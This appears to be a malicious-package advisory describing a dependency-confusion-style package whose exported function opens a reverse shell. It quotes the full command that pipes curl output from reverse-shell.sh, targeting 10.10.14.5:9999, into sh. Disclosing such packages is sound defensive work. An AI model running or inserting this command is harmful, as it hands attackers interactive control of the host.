summary: Reverse shell backdoor fetched from remote URL and executed via /bin/bash
details: The package's index.js exports a `command` function that runs `/bin/bash -c "curl https://reverse-shell.sh/10.10.14.5:9999|sh"`, fetching a reverse-shell script from reverse-shell.sh targeting 10.10.14.5:9999 and piping it to sh. The 10.10.14.0/24 range is commonly used as attacker/CTF infrastructure. The package contains no other functionality — the 203-byte index.js exists solely to deliver this remote-code-execution primitive, and the package name `internallib_v557` mimics an internal-library naming pattern consistent with dependency-confusion attacks against private registries. Any consumer who requires this package and invokes the exported function grants the attacker a full interactive shell on the installer's host.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
